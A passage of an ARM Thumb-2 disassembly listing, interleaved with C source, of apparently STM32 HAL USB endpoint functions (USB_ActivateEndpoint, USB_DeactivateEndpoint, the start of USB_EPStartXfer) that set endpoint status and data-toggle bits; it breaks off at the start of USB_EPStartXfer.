 80065c8:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80065cc:	b29b      	uxth	r3, r3
 80065ce:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80065d0:	683b      	ldr	r3, [r7, #0]
 80065d2:	78db      	ldrb	r3, [r3, #3]
 80065d4:	2b01      	cmp	r3, #1
 80065d6:	d024      	beq.n	8006622 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80065d8:	687a      	ldr	r2, [r7, #4]
 80065da:	683b      	ldr	r3, [r7, #0]
 80065dc:	781b      	ldrb	r3, [r3, #0]
 80065de:	009b      	lsls	r3, r3, #2
 80065e0:	4413      	add	r3, r2
 80065e2:	881b      	ldrh	r3, [r3, #0]
 80065e4:	b29b      	uxth	r3, r3
 80065e6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065ea:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065ee:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80065f2:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80065f6:	f083 0320 	eor.w	r3, r3, #32
 80065fa:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80065fe:	687a      	ldr	r2, [r7, #4]
 8006600:	683b      	ldr	r3, [r7, #0]
 8006602:	781b      	ldrb	r3, [r3, #0]
 8006604:	009b      	lsls	r3, r3, #2
 8006606:	441a      	add	r2, r3
 8006608:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800660c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006610:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006614:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006618:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800661c:	b29b      	uxth	r3, r3
 800661e:	8013      	strh	r3, [r2, #0]
 8006620:	e01d      	b.n	800665e <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006622:	687a      	ldr	r2, [r7, #4]
 8006624:	683b      	ldr	r3, [r7, #0]
 8006626:	781b      	ldrb	r3, [r3, #0]
 8006628:	009b      	lsls	r3, r3, #2
 800662a:	4413      	add	r3, r2
 800662c:	881b      	ldrh	r3, [r3, #0]
 800662e:	b29b      	uxth	r3, r3
 8006630:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006634:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006638:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 800663c:	687a      	ldr	r2, [r7, #4]
 800663e:	683b      	ldr	r3, [r7, #0]
 8006640:	781b      	ldrb	r3, [r3, #0]
 8006642:	009b      	lsls	r3, r3, #2
 8006644:	441a      	add	r2, r3
 8006646:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 800664a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800664e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006652:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006656:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800665a:	b29b      	uxth	r3, r3
 800665c:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800665e:	687a      	ldr	r2, [r7, #4]
 8006660:	683b      	ldr	r3, [r7, #0]
 8006662:	781b      	ldrb	r3, [r3, #0]
 8006664:	009b      	lsls	r3, r3, #2
 8006666:	4413      	add	r3, r2
 8006668:	881b      	ldrh	r3, [r3, #0]
 800666a:	b29b      	uxth	r3, r3
 800666c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006670:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006674:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8006678:	687a      	ldr	r2, [r7, #4]
 800667a:	683b      	ldr	r3, [r7, #0]
 800667c:	781b      	ldrb	r3, [r3, #0]
 800667e:	009b      	lsls	r3, r3, #2
 8006680:	441a      	add	r2, r3
 8006682:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8006686:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800668a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800668e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006692:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006696:	b29b      	uxth	r3, r3
 8006698:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800669a:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 800669e:	4618      	mov	r0, r3
 80066a0:	3774      	adds	r7, #116	; 0x74
 80066a2:	46bd      	mov	sp, r7
 80066a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80066a8:	4770      	bx	lr
 80066aa:	bf00      	nop

080066ac <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80066ac:	b480      	push	{r7}
 80066ae:	b08d      	sub	sp, #52	; 0x34
 80066b0:	af00      	add	r7, sp, #0
 80066b2:	6078      	str	r0, [r7, #4]
 80066b4:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80066b6:	683b      	ldr	r3, [r7, #0]
 80066b8:	7b1b      	ldrb	r3, [r3, #12]
 80066ba:	2b00      	cmp	r3, #0
 80066bc:	f040 808e 	bne.w	80067dc <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 80066c0:	683b      	ldr	r3, [r7, #0]
 80066c2:	785b      	ldrb	r3, [r3, #1]
 80066c4:	2b00      	cmp	r3, #0
 80066c6:	d044      	beq.n	8006752 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80066c8:	687a      	ldr	r2, [r7, #4]
 80066ca:	683b      	ldr	r3, [r7, #0]
 80066cc:	781b      	ldrb	r3, [r3, #0]
 80066ce:	009b      	lsls	r3, r3, #2
 80066d0:	4413      	add	r3, r2
 80066d2:	881b      	ldrh	r3, [r3, #0]
 80066d4:	81bb      	strh	r3, [r7, #12]
 80066d6:	89bb      	ldrh	r3, [r7, #12]
 80066d8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80066dc:	2b00      	cmp	r3, #0
 80066de:	d01b      	beq.n	8006718 <USB_DeactivateEndpoint+0x6c>
 80066e0:	687a      	ldr	r2, [r7, #4]
 80066e2:	683b      	ldr	r3, [r7, #0]
 80066e4:	781b      	ldrb	r3, [r3, #0]
 80066e6:	009b      	lsls	r3, r3, #2
 80066e8:	4413      	add	r3, r2
 80066ea:	881b      	ldrh	r3, [r3, #0]
 80066ec:	b29b      	uxth	r3, r3
 80066ee:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066f6:	817b      	strh	r3, [r7, #10]
 80066f8:	687a      	ldr	r2, [r7, #4]
 80066fa:	683b      	ldr	r3, [r7, #0]
 80066fc:	781b      	ldrb	r3, [r3, #0]
 80066fe:	009b      	lsls	r3, r3, #2
 8006700:	441a      	add	r2, r3
 8006702:	897b      	ldrh	r3, [r7, #10]
 8006704:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006708:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800670c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006710:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006714:	b29b      	uxth	r3, r3
 8006716:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006718:	687a      	ldr	r2, [r7, #4]
 800671a:	683b      	ldr	r3, [r7, #0]
 800671c:	781b      	ldrb	r3, [r3, #0]
 800671e:	009b      	lsls	r3, r3, #2
 8006720:	4413      	add	r3, r2
 8006722:	881b      	ldrh	r3, [r3, #0]
 8006724:	b29b      	uxth	r3, r3
 8006726:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800672a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800672e:	813b      	strh	r3, [r7, #8]
 8006730:	687a      	ldr	r2, [r7, #4]
 8006732:	683b      	ldr	r3, [r7, #0]
 8006734:	781b      	ldrb	r3, [r3, #0]
 8006736:	009b      	lsls	r3, r3, #2
 8006738:	441a      	add	r2, r3
 800673a:	893b      	ldrh	r3, [r7, #8]
 800673c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006740:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006744:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006748:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800674c:	b29b      	uxth	r3, r3
 800674e:	8013      	strh	r3, [r2, #0]
 8006750:	e192      	b.n	8006a78 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006752:	687a      	ldr	r2, [r7, #4]
 8006754:	683b      	ldr	r3, [r7, #0]
 8006756:	781b      	ldrb	r3, [r3, #0]
 8006758:	009b      	lsls	r3, r3, #2
 800675a:	4413      	add	r3, r2
 800675c:	881b      	ldrh	r3, [r3, #0]
 800675e:	827b      	strh	r3, [r7, #18]
 8006760:	8a7b      	ldrh	r3, [r7, #18]
 8006762:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006766:	2b00      	cmp	r3, #0
 8006768:	d01b      	beq.n	80067a2 <USB_DeactivateEndpoint+0xf6>
 800676a:	687a      	ldr	r2, [r7, #4]
 800676c:	683b      	ldr	r3, [r7, #0]
 800676e:	781b      	ldrb	r3, [r3, #0]
 8006770:	009b      	lsls	r3, r3, #2
 8006772:	4413      	add	r3, r2
 8006774:	881b      	ldrh	r3, [r3, #0]
 8006776:	b29b      	uxth	r3, r3
 8006778:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800677c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006780:	823b      	strh	r3, [r7, #16]
 8006782:	687a      	ldr	r2, [r7, #4]
 8006784:	683b      	ldr	r3, [r7, #0]
 8006786:	781b      	ldrb	r3, [r3, #0]
 8006788:	009b      	lsls	r3, r3, #2
 800678a:	441a      	add	r2, r3
 800678c:	8a3b      	ldrh	r3, [r7, #16]
 800678e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006792:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006796:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800679a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800679e:	b29b      	uxth	r3, r3
 80067a0:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80067a2:	687a      	ldr	r2, [r7, #4]
 80067a4:	683b      	ldr	r3, [r7, #0]
 80067a6:	781b      	ldrb	r3, [r3, #0]
 80067a8:	009b      	lsls	r3, r3, #2
 80067aa:	4413      	add	r3, r2
 80067ac:	881b      	ldrh	r3, [r3, #0]
 80067ae:	b29b      	uxth	r3, r3
 80067b0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80067b4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067b8:	81fb      	strh	r3, [r7, #14]
 80067ba:	687a      	ldr	r2, [r7, #4]
 80067bc:	683b      	ldr	r3, [r7, #0]
 80067be:	781b      	ldrb	r3, [r3, #0]
 80067c0:	009b      	lsls	r3, r3, #2
 80067c2:	441a      	add	r2, r3
 80067c4:	89fb      	ldrh	r3, [r7, #14]
 80067c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ce:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067d6:	b29b      	uxth	r3, r3
 80067d8:	8013      	strh	r3, [r2, #0]
 80067da:	e14d      	b.n	8006a78 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 80067dc:	683b      	ldr	r3, [r7, #0]
 80067de:	785b      	ldrb	r3, [r3, #1]
 80067e0:	2b00      	cmp	r3, #0
 80067e2:	f040 80a5 	bne.w	8006930 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80067e6:	687a      	ldr	r2, [r7, #4]
 80067e8:	683b      	ldr	r3, [r7, #0]
 80067ea:	781b      	ldrb	r3, [r3, #0]
 80067ec:	009b      	lsls	r3, r3, #2
 80067ee:	4413      	add	r3, r2
 80067f0:	881b      	ldrh	r3, [r3, #0]
 80067f2:	843b      	strh	r3, [r7, #32]
 80067f4:	8c3b      	ldrh	r3, [r7, #32]
 80067f6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80067fa:	2b00      	cmp	r3, #0
 80067fc:	d01b      	beq.n	8006836 <USB_DeactivateEndpoint+0x18a>
 80067fe:	687a      	ldr	r2, [r7, #4]
 8006800:	683b      	ldr	r3, [r7, #0]
 8006802:	781b      	ldrb	r3, [r3, #0]
 8006804:	009b      	lsls	r3, r3, #2
 8006806:	4413      	add	r3, r2
 8006808:	881b      	ldrh	r3, [r3, #0]
 800680a:	b29b      	uxth	r3, r3
 800680c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006810:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006814:	83fb      	strh	r3, [r7, #30]
 8006816:	687a      	ldr	r2, [r7, #4]
 8006818:	683b      	ldr	r3, [r7, #0]
 800681a:	781b      	ldrb	r3, [r3, #0]
 800681c:	009b      	lsls	r3, r3, #2
 800681e:	441a      	add	r2, r3
 8006820:	8bfb      	ldrh	r3, [r7, #30]
 8006822:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006826:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800682a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800682e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006832:	b29b      	uxth	r3, r3
 8006834:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006836:	687a      	ldr	r2, [r7, #4]
 8006838:	683b      	ldr	r3, [r7, #0]
 800683a:	781b      	ldrb	r3, [r3, #0]
 800683c:	009b      	lsls	r3, r3, #2
 800683e:	4413      	add	r3, r2
 8006840:	881b      	ldrh	r3, [r3, #0]
 8006842:	83bb      	strh	r3, [r7, #28]
 8006844:	8bbb      	ldrh	r3, [r7, #28]
 8006846:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800684a:	2b00      	cmp	r3, #0
 800684c:	d01b      	beq.n	8006886 <USB_DeactivateEndpoint+0x1da>
 800684e:	687a      	ldr	r2, [r7, #4]
 8006850:	683b      	ldr	r3, [r7, #0]
 8006852:	781b      	ldrb	r3, [r3, #0]
 8006854:	009b      	lsls	r3, r3, #2
 8006856:	4413      	add	r3, r2
 8006858:	881b      	ldrh	r3, [r3, #0]
 800685a:	b29b      	uxth	r3, r3
 800685c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006860:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006864:	837b      	strh	r3, [r7, #26]
 8006866:	687a      	ldr	r2, [r7, #4]
 8006868:	683b      	ldr	r3, [r7, #0]
 800686a:	781b      	ldrb	r3, [r3, #0]
 800686c:	009b      	lsls	r3, r3, #2
 800686e:	441a      	add	r2, r3
 8006870:	8b7b      	ldrh	r3, [r7, #26]
 8006872:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006876:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800687a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800687e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006882:	b29b      	uxth	r3, r3
 8006884:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 8006886:	687a      	ldr	r2, [r7, #4]
 8006888:	683b      	ldr	r3, [r7, #0]
 800688a:	781b      	ldrb	r3, [r3, #0]
 800688c:	009b      	lsls	r3, r3, #2
 800688e:	4413      	add	r3, r2
 8006890:	881b      	ldrh	r3, [r3, #0]
 8006892:	b29b      	uxth	r3, r3
 8006894:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006898:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800689c:	833b      	strh	r3, [r7, #24]
 800689e:	687a      	ldr	r2, [r7, #4]
 80068a0:	683b      	ldr	r3, [r7, #0]
 80068a2:	781b      	ldrb	r3, [r3, #0]
 80068a4:	009b      	lsls	r3, r3, #2
 80068a6:	441a      	add	r2, r3
 80068a8:	8b3b      	ldrh	r3, [r7, #24]
 80068aa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068ae:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068b2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068b6:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80068ba:	b29b      	uxth	r3, r3
 80068bc:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80068be:	687a      	ldr	r2, [r7, #4]
 80068c0:	683b      	ldr	r3, [r7, #0]
 80068c2:	781b      	ldrb	r3, [r3, #0]
 80068c4:	009b      	lsls	r3, r3, #2
 80068c6:	4413      	add	r3, r2
 80068c8:	881b      	ldrh	r3, [r3, #0]
 80068ca:	b29b      	uxth	r3, r3
 80068cc:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80068d0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068d4:	82fb      	strh	r3, [r7, #22]
 80068d6:	687a      	ldr	r2, [r7, #4]
 80068d8:	683b      	ldr	r3, [r7, #0]
 80068da:	781b      	ldrb	r3, [r3, #0]
 80068dc:	009b      	lsls	r3, r3, #2
 80068de:	441a      	add	r2, r3
 80068e0:	8afb      	ldrh	r3, [r7, #22]
 80068e2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068e6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068ea:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068ee:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068f2:	b29b      	uxth	r3, r3
 80068f4:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80068f6:	687a      	ldr	r2, [r7, #4]
 80068f8:	683b      	ldr	r3, [r7, #0]
 80068fa:	781b      	ldrb	r3, [r3, #0]
 80068fc:	009b      	lsls	r3, r3, #2
 80068fe:	4413      	add	r3, r2
 8006900:	881b      	ldrh	r3, [r3, #0]
 8006902:	b29b      	uxth	r3, r3
 8006904:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006908:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800690c:	82bb      	strh	r3, [r7, #20]
 800690e:	687a      	ldr	r2, [r7, #4]
 8006910:	683b      	ldr	r3, [r7, #0]
 8006912:	781b      	ldrb	r3, [r3, #0]
 8006914:	009b      	lsls	r3, r3, #2
 8006916:	441a      	add	r2, r3
 8006918:	8abb      	ldrh	r3, [r7, #20]
 800691a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800691e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006922:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006926:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800692a:	b29b      	uxth	r3, r3
 800692c:	8013      	strh	r3, [r2, #0]
 800692e:	e0a3      	b.n	8006a78 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006930:	687a      	ldr	r2, [r7, #4]
 8006932:	683b      	ldr	r3, [r7, #0]
 8006934:	781b      	ldrb	r3, [r3, #0]
 8006936:	009b      	lsls	r3, r3, #2
 8006938:	4413      	add	r3, r2
 800693a:	881b      	ldrh	r3, [r3, #0]
 800693c:	85fb      	strh	r3, [r7, #46]	; 0x2e
 800693e:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006940:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006944:	2b00      	cmp	r3, #0
 8006946:	d01b      	beq.n	8006980 <USB_DeactivateEndpoint+0x2d4>
 8006948:	687a      	ldr	r2, [r7, #4]
 800694a:	683b      	ldr	r3, [r7, #0]
 800694c:	781b      	ldrb	r3, [r3, #0]
 800694e:	009b      	lsls	r3, r3, #2
 8006950:	4413      	add	r3, r2
 8006952:	881b      	ldrh	r3, [r3, #0]
 8006954:	b29b      	uxth	r3, r3
 8006956:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800695a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800695e:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006960:	687a      	ldr	r2, [r7, #4]
 8006962:	683b      	ldr	r3, [r7, #0]
 8006964:	781b      	ldrb	r3, [r3, #0]
 8006966:	009b      	lsls	r3, r3, #2
 8006968:	441a      	add	r2, r3
 800696a:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 800696c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006970:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006974:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006978:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800697c:	b29b      	uxth	r3, r3
 800697e:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006980:	687a      	ldr	r2, [r7, #4]
 8006982:	683b      	ldr	r3, [r7, #0]
 8006984:	781b      	ldrb	r3, [r3, #0]
 8006986:	009b      	lsls	r3, r3, #2
 8006988:	4413      	add	r3, r2
 800698a:	881b      	ldrh	r3, [r3, #0]
 800698c:	857b      	strh	r3, [r7, #42]	; 0x2a
 800698e:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006990:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006994:	2b00      	cmp	r3, #0
 8006996:	d01b      	beq.n	80069d0 <USB_DeactivateEndpoint+0x324>
 8006998:	687a      	ldr	r2, [r7, #4]
 800699a:	683b      	ldr	r3, [r7, #0]
 800699c:	781b      	ldrb	r3, [r3, #0]
 800699e:	009b      	lsls	r3, r3, #2
 80069a0:	4413      	add	r3, r2
 80069a2:	881b      	ldrh	r3, [r3, #0]
 80069a4:	b29b      	uxth	r3, r3
 80069a6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069aa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069ae:	853b      	strh	r3, [r7, #40]	; 0x28
 80069b0:	687a      	ldr	r2, [r7, #4]
 80069b2:	683b      	ldr	r3, [r7, #0]
 80069b4:	781b      	ldrb	r3, [r3, #0]
 80069b6:	009b      	lsls	r3, r3, #2
 80069b8:	441a      	add	r2, r3
 80069ba:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 80069bc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069c0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069c4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069c8:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80069cc:	b29b      	uxth	r3, r3
 80069ce:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 80069d0:	687a      	ldr	r2, [r7, #4]
 80069d2:	683b      	ldr	r3, [r7, #0]
 80069d4:	781b      	ldrb	r3, [r3, #0]
 80069d6:	009b      	lsls	r3, r3, #2
 80069d8:	4413      	add	r3, r2
 80069da:	881b      	ldrh	r3, [r3, #0]
 80069dc:	b29b      	uxth	r3, r3
 80069de:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069e2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069e6:	84fb      	strh	r3, [r7, #38]	; 0x26
 80069e8:	687a      	ldr	r2, [r7, #4]
 80069ea:	683b      	ldr	r3, [r7, #0]
 80069ec:	781b      	ldrb	r3, [r3, #0]
 80069ee:	009b      	lsls	r3, r3, #2
 80069f0:	441a      	add	r2, r3
 80069f2:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 80069f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069fc:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006a00:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a04:	b29b      	uxth	r3, r3
 8006a06:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006a08:	687a      	ldr	r2, [r7, #4]
 8006a0a:	683b      	ldr	r3, [r7, #0]
 8006a0c:	781b      	ldrb	r3, [r3, #0]
 8006a0e:	009b      	lsls	r3, r3, #2
 8006a10:	4413      	add	r3, r2
 8006a12:	881b      	ldrh	r3, [r3, #0]
 8006a14:	b29b      	uxth	r3, r3
 8006a16:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a1a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006a1e:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006a20:	687a      	ldr	r2, [r7, #4]
 8006a22:	683b      	ldr	r3, [r7, #0]
 8006a24:	781b      	ldrb	r3, [r3, #0]
 8006a26:	009b      	lsls	r3, r3, #2
 8006a28:	441a      	add	r2, r3
 8006a2a:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006a2c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a30:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a34:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a38:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a3c:	b29b      	uxth	r3, r3
 8006a3e:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006a40:	687a      	ldr	r2, [r7, #4]
 8006a42:	683b      	ldr	r3, [r7, #0]
 8006a44:	781b      	ldrb	r3, [r3, #0]
 8006a46:	009b      	lsls	r3, r3, #2
 8006a48:	4413      	add	r3, r2
 8006a4a:	881b      	ldrh	r3, [r3, #0]
 8006a4c:	b29b      	uxth	r3, r3
 8006a4e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006a52:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a56:	847b      	strh	r3, [r7, #34]	; 0x22
 8006a58:	687a      	ldr	r2, [r7, #4]
 8006a5a:	683b      	ldr	r3, [r7, #0]
 8006a5c:	781b      	ldrb	r3, [r3, #0]
 8006a5e:	009b      	lsls	r3, r3, #2
 8006a60:	441a      	add	r2, r3
 8006a62:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006a64:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a68:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a6c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a70:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a74:	b29b      	uxth	r3, r3
 8006a76:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006a78:	2300      	movs	r3, #0
}
 8006a7a:	4618      	mov	r0, r3
 8006a7c:	3734      	adds	r7, #52	; 0x34
 8006a7e:	46bd      	mov	sp, r7
 8006a80:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006a84:	4770      	bx	lr

08006a86 <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006a86:	b580      	push	{r7, lr}
 8006a88:	b0c2      	sub	sp, #264	; 0x108
 8006a8a:	af00      	add	r7, sp, #0
 8006a8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a90:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a94:	6018      	str	r0, [r3, #0]
 8006a96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a9e:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
